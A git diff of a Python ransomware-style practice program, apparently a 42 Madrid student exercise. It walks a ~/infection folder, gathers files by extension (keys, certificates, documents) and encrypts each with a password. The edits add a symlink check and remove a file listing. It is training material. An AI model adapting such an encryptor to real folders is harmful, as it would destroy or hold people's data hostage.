@@ -6,7 +6,7 @@
 #    By: tvillare <tvillare@student.42madrid.com    +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2023/05/18 18:07:39 by tvillare          #+#    #+#              #
-#    Updated: 2023/05/21 14:43:50 by tvillare         ###   ########.fr        #
+#    Updated: 2023/05/21 16:46:43 by tvillare         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -33,13 +33,15 @@ exet = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', 
 
 exet_ft = [".ft",]
 
+files = []
+
 def	get_files(ruta_carpeta, ex_files):
 	# Obtener la lista de archivos y directorios en la carpeta
 	elementos = os.listdir(ruta_carpeta)
 	# Recorrer y mostrar los nombres de los archivos y directorios
 	for elemento in elementos:
 		ruta_elemento = os.path.join(ruta_carpeta, elemento)
-		if os.path.isdir(ruta_elemento):
+		if os.path.isdir(ruta_elemento) and os.path.islink(ruta_elemento) == False:
 			get_files(ruta_elemento, ex_files)
 		elif any(elemento.endswith(extension) for extension in ex_files):
 			files.append(ruta_elemento)
@@ -55,13 +57,15 @@ def	get_home():
 		home = os.environ['HOME']
 	if os.path.isdir(home + "/infection"):
 		return(home + "/infection")
+		#return "pruebas"
 	else:
 		print("NO Existe la carpeta infection en HOME o no es valida")
 		sys.exit()
 
-files = []
+
 args = parseo()
 home = get_home()
+
 if args.h == True:
 	ft_help()
 elif args.v == True:
@@ -77,7 +81,4 @@ else:
 	for doc in files:
 		cifrar_archivo(doc, passwd, args.s)
 
-if args.s == True:
-	for i in files:
-		print("file -> ", i)
 
